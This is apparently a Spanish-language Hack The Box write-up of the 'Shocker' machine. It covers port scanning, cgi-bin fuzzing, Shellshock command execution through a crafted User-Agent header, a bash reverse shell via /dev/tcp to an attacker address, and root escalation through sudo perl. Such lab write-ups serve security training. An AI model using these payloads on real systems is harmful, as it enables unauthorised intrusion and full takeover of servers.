---
layout: post
title: HTB Shocker
date: '2023-12-21 18:31:59 -0500'
categories: [HTB, Easy]
tags: [Web, ShellShock, Linux, Sudoers, Perl, Fuzzing] 
image:
  path: /shocker/preview.png
  alt: Shocker 
---

## Resumen
![logo](/shocker/logo.png){: .right w="200" h="200" }
**Shocker** es una máquina **fácil** en la que es necesario **fuzzear** un sitio **web** para descubrir que existe una carpeta un tanto llamativa llamada **cgi-bin**. Esta carpeta está relacionada con un ataque llamado **Shellshock**, que permite al atacante ejecutar comandos dentro de la máquina gracias a un **user-agent** especial. Sin embargo, para que esto pueda suceder, debe existir un archivo dentro de la carpeta con una extensión específica, y milagrosamente existe en este caso. Después de realizar la enumeración, solo hace falta llevar a cabo el ataque para obtener una **shell reversa**. Una vez dentro de la máquina, solo es necesario revisar los permisos a nivel de **sudoers**, y se ve que se cuenta con la posibilidad de ejecutar un **binario** interesante como **root**. Esta máquina fue divertida y fácil de hacer, perfecta para practicar el **ataque**.

## Reconocimiento 
Para empezar, se realiza un **ping** para verificar la conectividad con la máquina.

```bash
ping 10.10.10.56 -c 1

64 bytes from 10.10.10.56: icmp_seq=1 ttl=63 time=162 ms

--- 10.10.10.56 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```
{: .nolineno}

### Escaneo de Puerto

Se puede realizar un escaneo con **nmap** para ver qué puertos se encuentran abiertos dentro de la máquina:

```bash
nmap -p- --min-rate 2000 10.10.10.56 -Pn -oG ports

Warning: 10.10.10.56 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.56
Host is up (0.16s latency).
Not shown: 63916 closed tcp ports (conn-refused), 1617 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```
{: .nolineno}


Con la información obtenida, se puede realizar un escaneo mucho más profundo para obtener las tecnologías y versiones que se están utilizando dentro del servidor:


```bash
nmap -p80,2222 -sVC --min-rate 2000 10.10.10.56 -oN versions -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-21 19:34 EST
Nmap scan report for 10.10.10.56
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}

## Enumeración 

Al revisar dentro de la web, no se puede encontrar nada interesante.

![web](/shocker/web.png)

Pero al listar directorios con ayuda de **GoBuster**, se puede ver lo siguiente.

```bash
gobuster dir -u http://10.10.10.56/ -w /usr/share/seclists/Discovery/Web-Content/big.txt  -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 295]
/.htpasswd            (Status: 403) [Size: 295]
/cgi-bin/             (Status: 403) [Size: 294]
/server-status        (Status: 403) [Size: 299]
```
{: .nolineno}

Dentro de los directorios se ve uno llamado **cgi-bin**, por lo que podría presentarse la posibilidad de que el sistema sea vulnerable a un ataque de **Shellshock**.

> Una vulnerabilidad presente en algunos servidores Web, es el conocido ShellShock, que es una vulnerabilidad en el Shell Bash de los sistemas operativos Linux/Unix, el cual permite ejecutar comandos por atacantes de manera remota, por lo que se le conoce también con el nombre de Bashdoor.
{: .prompt-info}


Se puede revisar si existe algún archivo con la extensión válida para realizar el ataque dentro de la carpeta con el siguiente comando:
```bash
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x pl,sh,bash,cgi
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              sh,bash,cgi,pl
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 118]
```
{: .nolineno}


## Explotación

Como se ve que existe el archivo **user.sh**, se puede realizar el ataque sobre esa ruta.

> Con esta vulnerabilidad, es una buena idea usar rutas absolutas para que los comandos sean ejecutados de forma correcta. Esto se puede descubrir con ayuda del comando 'which', que se encuentra en dos rutas posibles: /usr/bin/which o /bin/which.
{: .prompt-tip}

```bash
curl -H "User-Agent: () { :; }; echo; echo; /usr/bin/which whoami " http://10.10.10.56/cgi-bin/user.sh

/usr/bin/whoami
```
{: .nolineno}


```bash
curl -H "User-Agent: () { :; }; echo; echo; /usr/bin/whoami " http://10.10.10.56/cgi-bin/user.sh

shelly
```
{: .nolineno}

Para obtener una **shell reversa**, es necesario ponerse a la escucha con **nc** y ejecutar el siguiente **payload**.

```bash
nc -lvp 4444
```
{: .nolineno}


```bash
curl -s http://10.10.10.56/cgi-bin/user.sh -H "User-Agent: () { :; }; echo;echo; /bin/bash -c '/bin/bash -i>& /dev/tcp/10.10.14.17/4444 0>&1' "
```
{: .nolineno}



```bash
 nc -lvp  4444
listening on [any] 4444 ...
10.10.10.56: inverse host lookup failed: Unknown host
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.56] 51062
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ ls
ls
user.sh
shelly@Shocker:/usr/lib/cgi-bin$ 
```
{: .nolineno}

Con eso, ya se puede buscar la bandera de usuario dentro del sistema.

## Escalada de Privilegios

Para escalar privilegios, solo hace falta revisar los **privilegios** a nivel de **sudoers** dentro del equipo, y se puede ver que el usuario puede ejecutar el comando **perl** como **root**.


```bash
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
{: .nolineno}


Por lo que se puede hacer uso de [GTFOBins](https://gtfobins.github.io/) para buscar alguna manera de escalar privilegios. Y al investigar sobre alguna forma de abusar de **perl** se encuentra lo siguiente:


![gtfo](/shocker/gtfo.png)


```bash
sudo perl -e 'exec "/bin/sh";'
```
{: .nolineno}


Y al ejecutar el comando se gana privilegios como el usuario **root**.


```bash
shelly@Shocker:/usr/lib/cgi-bin$  sudo /usr/bin/perl -e 'exec "/bin/sh";'
whoami
root
ls /root
root.txt
```
{: .nolineno}












